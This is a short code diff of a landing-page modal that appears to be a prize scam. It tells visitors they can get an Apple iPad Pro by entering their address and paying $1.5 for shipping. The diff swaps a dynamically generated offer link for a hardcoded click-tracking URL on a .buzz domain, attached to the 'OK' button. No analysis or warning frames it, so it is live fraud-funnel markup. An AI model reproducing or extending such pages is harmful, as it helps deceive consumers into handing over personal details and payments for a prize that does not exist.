@@ -241,7 +241,7 @@ var modalOptions = {
 			  <p style=" line-height:18px; padding-bottom:10px;">1. Enter your address.</p>
 			  <p style=" line-height:18px; padding-bottom:10px;">2. Pay $1.5 for shipping to get your Apple iPad Pro.</p>
 			  <p style=" line-height:18px;">3. Your Apple iPad Pro will be delivered within 5-7 days!</p>
-              <div id="p_modal_button3" class="p_modal_button"><a id="offerlink" style="display:block;" href="<?= $client->getOffer() ?>">OK</a></div><!--CTA-->
+              <div id="p_modal_button3" class="p_modal_button"><a id="offerlink" style="display:block;" href="https://org.rangextd.buzz/click.php?lp=1">OK</a></div><!--CTA-->
             </div>
           </div>
         </div>
